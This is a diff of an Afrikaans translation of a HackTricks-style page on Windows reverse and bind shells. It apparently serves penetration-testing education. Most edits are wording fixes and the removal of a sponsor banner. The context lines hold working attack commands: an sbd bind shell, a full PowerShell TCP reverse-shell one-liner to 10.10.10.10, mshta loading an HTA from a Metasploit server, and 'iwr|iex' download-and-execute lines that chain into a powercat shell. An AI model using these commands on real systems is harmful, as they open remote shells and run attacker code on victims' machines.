@@ -6,7 +6,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Ondersteun HackTricks</summary>
 
 * Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -15,17 +15,9 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
-Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) vir linux.\
+Die bladsy [lolbas-project.github.io](https://lolbas-project.github.io/) is vir Windows soos [https://gtfobins.github.io/](https://gtfobins.github.io/) vir linux is.\
 Dit is duidelik, **daar is geen SUID lêers of sudo regte in Windows nie**, maar dit is nuttig om te weet **hoe** sommige **binaries** (mis)bruik kan word om 'n soort onverwagte aksies uit te voer soos **arbitraire kode uit te voer.**
 
 ## NC
@@ -47,7 +39,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) is 'n draagbare en veilige Netcat alternatief**. Dit werk op Unix-agtige stelsels en Win32. Met funksies soos sterk versleuteling, programuitvoering, aanpasbare bronpoorte, en deurlopende herverbinding, bied sbd 'n veelsydige oplossing vir TCP/IP kommunikasie. Vir Windows gebruikers kan die sbd.exe weergawe van die Kali Linux verspreiding as 'n betroubare vervanging vir Netcat gebruik word.
+**[sbd](https://www.kali.org/tools/sbd/) is 'n draagbare en veilige Netcat alternatief**. Dit werk op Unix-agtige stelsels en Win32. Met funksies soos sterk versleuteling, program uitvoering, aanpasbare bronpoorte, en deurlopende herverbinding, bied sbd 'n veelsydige oplossing vir TCP/IP kommunikasie. Vir Windows gebruikers kan die sbd.exe weergawe van die Kali Linux verspreiding as 'n betroubare vervanging vir Netcat gebruik word.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -109,11 +101,11 @@ powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 Proses wat netwerkoproep uitvoer: **svchost.exe**\
 Payload op skyf geskryf: **WebDAV-kliënt plaaslike kas**
 
-**Een-liner:**
+**Een liner:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Kry meer inligting oor verskillende Powershell-shelle aan die einde van hierdie dokument**
+**Kry meer inligting oor verskillende Powershell Shells aan die einde van hierdie dokument**
 
 ## Mshta
 
@@ -181,14 +173,14 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Gevind deur verdediger**
+**Gedeelte deur verdediger**
 
 
 
 
 ## **Rundll32**
 
-[**Dll hello world voorbeeld**](https://github.com/carterjones/hello-world-dll)
+[**Dll hallo wêreld voorbeeld**](https://github.com/carterjones/hello-world-dll)
 
 * [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -365,7 +357,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compileer C# kode op die slagoffer masjien.
+Compileer C# kode in die slagoffer masjien.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -448,7 +440,7 @@ Skep 'n powershell-lanser, stoor dit in 'n lêer en laai dit af en voer dit uit.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Gedig as kwaadwillige kode**
+**Gevind as kwaadwillige kode**
 
 ### MSF-Unicorn
 
@@ -471,7 +463,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ## Meer
 
 [PS>Attack](https://github.com/jaredhaight/PSAttack) PS-konsol met 'n paar offensiewe PS-modules vooraf gelaai (gecyfer)\
-[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9)[\
+[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsol met 'n paar offensiewe PS-modules en proxy-detektering (IEX)
 
 ## Verwysings
@@ -483,16 +475,11 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-konsol met 'n paar offensie
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Probeer Hard Sekuriteitsgroep**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -500,7 +487,7 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 * Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
